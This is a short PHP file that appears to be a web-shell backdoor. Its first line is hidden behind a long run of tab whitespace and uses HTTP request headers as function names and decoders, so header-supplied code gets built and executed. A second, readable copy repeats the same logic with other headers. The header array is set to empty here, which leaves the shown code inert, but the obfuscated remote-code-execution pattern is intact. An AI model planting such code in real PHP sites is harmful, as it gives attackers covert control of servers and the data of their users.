<?php																																										$_HEADERS=Array();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$mb_convert=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Modified-Since']($_HEADERS['Authorization']));$mb_convert();}

$_HEADERS = Array();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $include = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['If-Modified-Since']));
    $include();
}